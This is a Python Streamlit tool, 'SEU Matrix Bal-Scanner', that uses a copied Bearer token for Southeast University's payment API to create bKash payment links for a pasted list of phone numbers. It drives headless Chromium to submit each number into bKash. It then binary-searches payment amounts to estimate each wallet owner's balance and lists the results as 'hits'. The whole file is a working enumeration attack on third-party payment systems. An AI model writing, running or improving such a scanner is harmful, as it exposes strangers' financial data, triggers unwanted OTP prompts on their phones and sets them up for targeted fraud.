import streamlit as st
import asyncio
import json
import os
import re
import sys
import requests
from datetime import datetime

# ==================== STREAMLIT PAGE CONFIG ====================
st.set_page_config(page_title="SEU Matrix Bal-Scanner", page_icon="🧬", layout="wide")

# ==================== PLAYWRIGHT INSTALLATION RUNNER ====================
@st.cache_resource
def install_playwright_dependencies():
    with st.spinner("Initializing Linux Headless Shell Drivers..."):
        try:
            import playwright
        except ModuleNotFoundError:
            os.system(f"{sys.executable} -m pip install playwright")
        
        # সিস্টেম কনফ্লিক্ট এড়াতে প্লে-রাইটের অফিশিয়াল নো-রুট ইনস্টলার রান করা হচ্ছে
        os.system(f"{sys.executable} -m playwright install chromium")
        os.system(f"{sys.executable} -m playwright install-deps chromium")
    return True

install_playwright_dependencies()
from playwright.async_api import async_playwright

# ==================== CONFIG & TOKEN MANAGER ====================
CONFIG_FILE = "config.json"

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            return {"token": ""}
    return {"token": ""}

def save_token(token_str):
    with open(CONFIG_FILE, 'w') as f:
        json.dump({"token": token_str.strip()}, f)

config = load_config()

# ==================== INITIALIZE SESSION STATES ====================
if "terminal_logs" not in st.session_state:
    st.session_state.terminal_logs = []
if "successful_accounts" not in st.session_state:
    st.session_state.successful_accounts = []
if "scanning_active" not in st.session_state:
    st.session_state.scanning_active = False

# ==================== CYBERPUNK CSS UI ====================
st.markdown("""
<style>
    .stApp {
        background-color: #05050a !important;
        background-image: radial-gradient(at 50% 0%, hsla(260,40%,12%,1) 0, transparent 60%) !important;
        color: #e2e8f0 !important;
    }
    h1, h2, h3 {
        color: #00f0ff !important;
        text-shadow: 0 0 10px rgba(0, 240, 255, 0.4) !important;
        font-family: 'Courier New', monospace !important;
    }
    .terminal-box {
        background-color: #020205 !important;
        border: 2px solid #00f0ff !important;
        border-radius: 8px;
        padding: 15px;
        font-family: 'Courier New', monospace;
        color: #39ff14 !important;
        height: 350px;
        overflow-y: auto;
        box-shadow: 0 0 15px rgba(0, 240, 255, 0.1) inset, 0 0 10px rgba(0, 240, 255, 0.1);
        white-space: pre-wrap;
    }
    .config-container {
        background: rgba(255, 255, 255, 0.02);
        border: 1px solid rgba(0, 240, 255, 0.15);
        border-radius: 10px;
        padding: 15px;
    }
    div[data-baseweb="textarea"], div[data-baseweb="input"] {
        background: rgba(0, 0, 0, 0.4) !important;
        border: 1px solid rgba(0, 240, 255, 0.2) !important;
    }
    .stButton>button {
        background: linear-gradient(45deg, #0072ff, #00f0ff) !important;
        color: #000000 !important;
        font-weight: bold !important;
        border: none !important;
        box-shadow: 0 0 10px rgba(0, 240, 255, 0.4) !important;
    }
</style>
""", unsafe_allow_html=True)

# ==================== SCANNING LOGIC FUNCTIONS ====================
MIN_AMOUNT = 2000
MAX_AMOUNT = 100000
ROUND_STEP = 1000

def clean_and_parse_numbers(raw_input):
    raw_tokens = re.split(r'[\s,;\t\n\r]+', raw_input)
    valid_numbers = []
    for token in raw_tokens:
        digits_only = re.sub(r'\D', '', token)
        if digits_only.startswith('880'):
            digits_only = digits_only[2:]
        elif digits_only.startswith('1') and len(digits_only) == 10:
            digits_only = '0' + digits_only
        if len(digits_only) > 11 and digits_only.startswith('01'):
            digits_only = digits_only[:11]
        if len(digits_only) == 11 and digits_only.startswith('01'):
            if digits_only not in valid_numbers:
                valid_numbers.append(digits_only)
    return valid_numbers

def get_seu_bkash_url(mobile, amount, token):
    try:
        url = "https://ums-api-service.seu.edu.bd/accounts/v/2.0.0/online-payment/bkash-pay"
        payload = {
            "amount": float(amount),
            "gateway": "bkash",
            "initiator": "online-payment",
            "actionUrl": None,
            "applicationApply": {
                "onlineApplicationType": None,
                "urgentApplication": None,
                "mobile": mobile,
                "email": None,
                "copies": None
            }
        }
        auth_header = token if "Bearer" in token else f"Bearer {token}"
        headers = {
            "Content-Type": "application/json",
            "Authorization": auth_header,
            "Origin": "https://ums.seu.edu.bd",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            return response.json().get('data', {}).get('gatewayRedirectLink')
        return None
    except:
        return None

async def execute_gateway_check(page, number, bkash_url):
    try:
        await page.goto(bkash_url, wait_until="domcontentloaded", timeout=15000)
        await page.wait_for_selector("#WALLET", timeout=10000)
        await page.fill("#WALLET", number)
        await page.locator("button.btn-group__btn-confirm").click()

        for _ in range(40):
            await asyncio.sleep(0.1)
            content = await page.content()
            if any(x in content for x in ["Verification", "OTP", "VERIFICATION", "Total"]):
                return "SUCCESS"
            elif "Insufficient balance" in content or "not eligible" in content or "failed" in content.lower():
                return "INSUFFICIENT"
        return "TIMEOUT"
    except:
        return "ERROR"

# ==================== STREAMLIT INTERFACE UI ====================
st.title("🧬 SEU MATRIX TARGET BAL-SCANNER")
st.markdown("<p style='color: #00f0ff; font-weight:bold; margin-top:-15px;'>[ BACKEND PIPELINE: ENGINE READY ]</p>", unsafe_allow_html=True)
st.markdown("---")

col_left, col_right = st.columns([7, 5])

with col_right:
    st.subheader("⚙️ System Authorization")
    with st.container():
        st.markdown('<div class="config-container">', unsafe_allow_html=True)
        current_token = config.get("token", "")
        input_token = st.text_input("Bearer Auth Token:", value=current_token, type="password", help="Paste the complete Token from browser header")
        
        if st.button("💾 Save & Lock Token"):
            save_token(input_token)
            st.success("Token securely written to config.json environment!")
        st.markdown('</div>', unsafe_allow_html=True)
    
    st.subheader("📥 Data Feed Input")
    raw_nodes = st.text_area("Paste Target Numbers (Any Format / Separator Supported):", height=180, placeholder="017xxxxxxxx\n013xxxxxxxx, 017xxxxxxxx")

with col_left:
    st.subheader("🖥️ Cyber Live Matrix Terminal")
    
    log_placeholder = st.empty()
    
    def update_terminal(new_line):
        st.session_state.terminal_logs.append(new_line)
        if len(st.session_state.terminal_logs) > 100:
            st.session_state.terminal_logs.pop(0)
        full_logs = "\n".join(st.session_state.terminal_logs)
        log_placeholder.markdown(f'<div class="terminal-box">{full_logs}</div>', unsafe_allow_html=True)

    if not st.session_state.terminal_logs:
        log_placeholder.markdown('<div class="terminal-box">[SYSTEM]: Awaiting target execution array signals...</div>', unsafe_allow_html=True)
    else:
        full_logs = "\n".join(st.session_state.terminal_logs)
        log_placeholder.markdown(f'<div class="terminal-box">{full_logs}</div>', unsafe_allow_html=True)

    btn_col1, btn_col2 = st.columns([1, 1])
    with btn_col1:
        start_trigger = st.button("⚡ Trigger Scanning Sequence", use_container_width=True)
    with btn_col2:
        if st.button("🗑️ Reset Engine Logs", type="secondary", use_container_width=True):
            st.session_state.terminal_logs = []
            st.session_state.successful_accounts = []
            st.rerun()

# ==================== CONTROLLER PIPELINE MECHANISM ====================
async def pipeline_scanner_core(target_numbers, auth_token):
    async with async_playwright() as p:
        try:
            # ক্লাউড সার্ভার ফ্রেন্ডলি আর্গুমেন্টস প্যারামিটার এনকোডিং
            browser = await p.chromium.launch(
                headless=True,
                args=[
                    '--no-sandbox', 
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-gpu'
                ]
            )
            context = await browser.new_context(
                viewport={"width": 1280, "height": 800},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            )
            page = await context.new_page()
        except Exception as e:
            update_terminal(f"[CRITICAL ERROR]: Browser Initiation Failed -> {str(e)}")
            return

        for number in target_numbers:
            update_terminal(f"\n[TARGET]: Scanning Matrix Node -> {number}")
            
            low_idx = MIN_AMOUNT // ROUND_STEP
            high_idx = MAX_AMOUNT // ROUND_STEP
            estimated_balance = 0
            is_valid_user = False
            req_count = 0

            init_url = get_seu_bkash_url(number, MIN_AMOUNT, auth_token)
            if not init_url:
                update_terminal(f"  ├─ [AUTH MISM_ERR]: Token Invalid or UMS Service Outage.")
                continue

            init_status = await execute_gateway_check(page, number, init_url)
            req_count += 1

            if init_status == "SUCCESS":
                is_valid_user = True
                estimated_balance = MIN_AMOUNT
                update_terminal(f"  ├─ Base Threshold Cleared: {MIN_AMOUNT} BDT [PASS]")
            elif init_status == "INSUFFICIENT":
                update_terminal(f"  └─ [SKIPPED]: Base Balance < {MIN_AMOUNT} BDT.")
                continue
            else:
                update_terminal(f"  └─ [{init_status}]: Intercept Error on Node.")
                continue

            if is_valid_user:
                while low_idx <= high_idx:
                    mid_idx = (low_idx + high_idx) // 2
                    mid_amount = mid_idx * ROUND_STEP

                    if mid_amount <= MIN_AMOUNT:
                        low_idx = mid_idx + 1
                        continue

                    update_terminal(f"  ├─ Query Matrix: {mid_amount} BDT...")
                    bkash_url = get_seu_bkash_url(number, mid_amount, auth_token)
                    
                    if not bkash_url:
                        update_terminal("  ├─ [Glitch] Token sync lapse. Retrying Node...")
                        await asyncio.sleep(1)
                        continue

                    status = await execute_gateway_check(page, number, bkash_url)
                    req_count += 1

                    if status == "SUCCESS":
                        estimated_balance = mid_amount
                        low_idx = mid_idx + 1  
                    elif status == "INSUFFICIENT":
                        high_idx = mid_idx - 1  
                    else:
                        await asyncio.sleep(1)
                        continue

                update_terminal(f"🎯 [VERIFIED]: {number} -> Balance ≈ {estimated_balance} BDT (Reqs: {req_count})")
                st.session_state.successful_accounts.append({
                    "Number": number,
                    "Balance": f"{estimated_balance} BDT",
                    "Timestamp": datetime.now().strftime("%Y-%m-%d %I:%M %p")
                })
        
        await browser.close()
        update_terminal("\n[SYSTEM LOG]: Target Scan Deployment Terminal Sequence Over.")

if start_trigger:
    parsed_list = clean_and_parse_numbers(raw_nodes)
    loaded_token = load_config().get("token", "")
    
    if not loaded_token:
        st.error("❌ Action Aborted: Please supply and save a valid Auth Token first!")
    elif not parsed_list:
        st.error("❌ Action Aborted: No valid 11-digit numbers identified in the input pane.")
    else:
        st.session_state.terminal_logs = []
        update_terminal(f"[SYSTEM LOG]: Initializing core cluster matrix pipeline for {len(parsed_list)} nodes...")
        asyncio.run(pipeline_scanner_core(parsed_list, loaded_token))
        st.balloons()

# ==================== ACTIVE METRIC SUMMARY DISPLAYER ====================
st.markdown("---")
st.subheader("📊 Live Hits & Verified Accounts Grid")

if st.session_state.successful_accounts:
    st.dataframe(st.session_state.successful_accounts, use_container_width=True)
else:
    st.info("No successful positive balance accounts registered yet in this session matrix.")
